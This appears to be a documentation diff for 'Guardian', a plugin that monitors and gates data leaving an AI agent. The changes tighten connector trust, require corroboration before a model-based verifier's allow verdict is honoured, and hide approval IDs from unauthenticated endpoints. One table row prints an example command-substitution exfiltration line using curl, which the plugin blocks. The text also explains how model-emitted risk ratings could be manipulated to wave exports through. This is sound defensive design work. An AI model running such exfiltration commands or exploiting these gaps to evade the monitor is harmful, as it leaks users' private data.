@@ -144,20 +144,23 @@ or `unknown`. This is what lets Guardian tell "save my inbox summary to my own N
 (self, allowed) from "email my inbox summary to a stranger" (external, gated) instead
 of gating both. Resolution is **local** — it calls no vendor service.
 
-Trusted-recipient entries resolve as `trusted_recipient` for more than message
-sends: an identity entry that names a store connector id (for example `notion`)
-also covers writes to that store (`mcp:notion`), so trusting a destination once
-covers it across action families. Trusted entries can also be exact terminal
-commands (see the `trust` approval option and `sharing destination suggest`).
+An MCP connector destination (`mcp:<name>`) is **never** trusted by name alone. It
+resolves to `self`/`trusted_recipient` only when you have explicitly added that
+connector — e.g. an `mcp:notion` entry — to the self allowlist or trusted recipients;
+a tool merely *named* `mcp_notion_*` does not inherit trust from a similarly-named
+first-party store. (An explicit trusted identity that names a connector id still covers
+writes to that connector across action families.) Trusted entries can also be exact
+terminal commands (see the `trust` approval option and `sharing destination suggest`).
 
 The defaults are conservative and fail closed. A destination whose ownership cannot
 be *proven* is `unknown`, and `unknown` is treated exactly as `external`. Mislabeling
 an external destination as `self` is the *only* way this design leaks, so every
 ambiguity resolves toward "not self." Out of the box you get a small, floor-safe set
-of seeded self stores (your own files / memory / todo / calendar / notion / drive,
-plus drafts); **send-to-self for your own messaging identities and own-infrastructure
-hosts is opt-in** — you add them explicitly to the self allowlist. No operator is
-forced to configure anything to retain the prior safety.
+of seeded self stores — your own first-party Hermes stores (files / memory / todo /
+calendar / drive) plus drafts. **Third-party MCP connectors (including Notion),
+your own messaging identities, and own-infrastructure hosts are opt-in** — you add
+them explicitly to the self allowlist. No operator is forced to configure anything to
+retain the prior safety.
 
 ### One declarative policy document
 
@@ -201,7 +204,7 @@ decision:
 {
   "version": 4,
   "whats_yours": {
-    "stores": ["store:files", "store:memory", "store:todo", "store:calendar", "store:notion", "store:drive", "draft:*"],
+    "stores": ["store:files", "store:memory", "store:todo", "store:calendar", "store:drive", "draft:*"],
     "identities": [],
     "hosts": []
   },
@@ -264,6 +267,16 @@ This channel is deliberately narrow and fail-closed:
 - The verifier treats it as authorization *evidence*, not an instruction: it can
   raise `authorization_level` for actions the user actually asked for, but cannot
   override `risk_level` or the absolute deny rules.
+- **Deterministic corroboration gate.** Because both `risk_level` and
+  `authorization_level` are model-emitted (and therefore attacker-influenceable), an
+  `allow` verdict for a private export to an `external`/`unknown` destination is honored
+  only when *both* the model rates `authorization_level` `explicit`/`substantive` **and**
+  Guardian actually holds owner/cron authorization context for this owner this window
+  (a fresh `user_request_context`, or a `cron_context` for a cron run). If that context
+  is absent, the allow is downgraded to manual approval regardless of risk band — so a
+  "medium-risk" self-report can no longer wave a tainted export through on the model's
+  word alone. Intra-boundary flows (self / local system / model provider) never reach the
+  verifier and are unaffected.
 - Authorization is scoped to the data actually being sent, not just the action.
   The verifier reads the real `action_arguments` (below) alongside the ambient
   classes the session has read, and judges the payload's content against the
@@ -458,7 +471,7 @@ High-level Security Module protections are enabled by default:
 | `account_security_content` | Password reset/recovery, auth codes, magic links, account verification, security alerts, and similar semantic account-security content. |
 | `credential_content` | Private keys, OAuth/session/cloud/API tokens, bearer tokens, JWTs, cookies, and `.env`-style secret assignments. API/service tokens are read inbound but blocked at egress — see below. |
 | `sensitive_links` | Reset, recovery, verification, confirmation, magic-link, OTP, and 2FA URLs. |
-| `intrinsic_exfiltration` | Same-call local, code, browser console/CDP, or obvious MCP private-source reads combined with network/share sinks before session taint exists. |
+| `intrinsic_exfiltration` | Same-call local, code, browser console/CDP, or obvious MCP private-source reads combined with network/share sinks before session taint exists. Includes any command substitution (`$(…)`/backticks) piped into a network tool — `curl "https://x/?d=$(cat ~/Documents/file)"` is blocked even when the read target is not a known-secret path. |
 | `private_network_reads` | Terminal remote-read shortcuts targeting localhost, private IPs, link-local/metadata hosts, or `.local` hosts. |
 
 Toggle rules with:
@@ -874,7 +887,14 @@ HERMES_GUARDIAN_DASHBOARD_MUTATIONS=0
 ```
 
 If `HERMES_GUARDIAN_DASHBOARD_ADMIN_TOKEN` is set, mutation requests must
-include that value in `x-hermes-guardian-token`.
+include that value in `x-hermes-guardian-token` (compared in constant time). When no
+token is set, the host dashboard's own authentication is the gate — it mounts these
+routes behind authenticated local/admin access — so set the token additionally when the
+plugin port is reachable outside that boundary.
+
+Independently of the token, the unauthenticated `GET /policy` and `GET /approvals`
+responses **do not** include the live four-digit approval ID, so a pending egress
+cannot be read and then self-approved over an unauthenticated channel.
 
 The dashboard stores and displays sanitized metadata, plus the sanitized
 verdict rationale (a best-effort-redacted, length-capped free-text string). It
